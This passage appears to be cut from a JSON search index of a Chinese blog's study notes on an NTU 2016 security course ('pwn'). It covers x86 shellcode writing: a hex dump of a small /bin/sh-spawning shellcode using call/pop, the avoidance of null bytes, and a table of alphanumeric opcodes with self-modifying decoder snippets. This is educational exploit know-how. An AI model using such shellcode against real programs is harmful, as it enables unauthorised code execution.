0x80用作payload时会产生0x00字符遇到read()的情况会被截断 $ xxd test.bin 00000000: eb0c 5bb8 0b00 0000 89c9 89d2 cd80 e8ef ..[............. 00000010: ffff ff2f 6269 6e2f 7368 00 .../bin/sh.Linux System Call Table ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:8:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"shellcode 不能有\\0 可以用call + pop的方式拿到shellcode address 长度不足时，如果还能输入可以make read函数 ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:9:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"},{"categories":["NTU STCS 2016"],"content":"alphanumeric Shellcode 只能用0-9写shellcode int 0x80 = \\xcd\\x80，如何用数字做sys_call？ 自修改 | decoder1 | encoded decoder2 | encoded shellcode | a 61 popa b 62 41 42 bound eax, QWORD PTR [ecx+0x42] c 63 41 42 arpl WORD PTR [ecx+0x42], ax d 64 41 fs inc ecx e 65 41 gs inc ecx f 66 41 inc cx g 67 41 addr16 inc ecx h 68 41 42 43 44 push 0x44434241 i 69 41 42 43 44 45 46 imul eax, DWORD PTR [ecx+0x42], 0x46454443 j 6a 41 push 0x41 k 6b 41 42 43 imul eax, DWORD PTR [ecx+0x42], 0x43 l 6c ins BYTE PTR es:[edi], dx m 6d ins DWORD PTR es:[edi], dx n 6e outs dx, BYTE PTR ds:[esi] o 6f outs dx, DWORD PTR ds:[esi] p 70 41 jo 0x43 q 71 41 jno 0x43 r 72 41 jb 0x43 s 73 41 jae 0x43 t 74 41 je 0x43 u 75 41 jne 0x43 v 76 41 jbe 0x43 w 77 41 ja 0x43 x 78 41 js 0x43 y 79 41 jns 0x43 z 7a 41 jp 0x43 A 41 inc ecx B 42 inc edx C 43 inc ebx D 44 inc esp E 45 inc ebp F 46 inc esi G 47 inc edi H 48 dec eax I 49 dec ecx J 4a dec edx K 4b dec ebx L 4c dec esp M 4d dec ebp N 4e dec esi O 4f dec edi P 50 push eax Q 51 push ecx R 52 push edx S 53 push ebx T 54 push esp U 55 push ebp V 56 push esi W 57 push edi X 58 pop eax Y 59 pop ecx Z 5a pop edx 0 30 41 42 xor BYTE PTR [ecx+0x42], al 1 31 41 42 xor DWORD PTR [ecx+0x42], eax 2 32 41 42 xor al, BYTE PTR [ecx+0x42] 3 33 41 42 xor eax, DWORD PTR [ecx+0x42] 4 34 41 xor al, 0x41 5 35 41 42 43 44 xor eax, 0x44434241 6 36 41 ss inc ecx 7 37 aaa 8 38 41 42 cmp BYTE PTR [ecx+0x42], al 9 39 41 42 cmp DWORD PTR [ecx+0x42], eax Register赋值 PQRSTUVWa 0: 50 push eax 1: 51 push ecx 2: 52 push edx 3: 53 push ebx 4: 54 push esp 5: 55 push ebp 6: 56 push esi 7: 57 push edi 8: 61 popa 自修改shellcode jDX0A1 0: 6a 44 push 0x44 2: 58 pop eax 3: 30 41 31 xor BYTE PTR [ecx+0x31],al eax赋值 jDX4C 0: 6a 44 push 0x44 2: 58 pop eax 3: 34 43 xor al,0x43 ","date":"2020-08-23","objectID":"/ntu-stcs-2016-w3/:10:0","tags":["pwn"],"title":"NTU STCS 2016 0x01 Intro","uri":"/ntu-stcs-2016-w3/"}]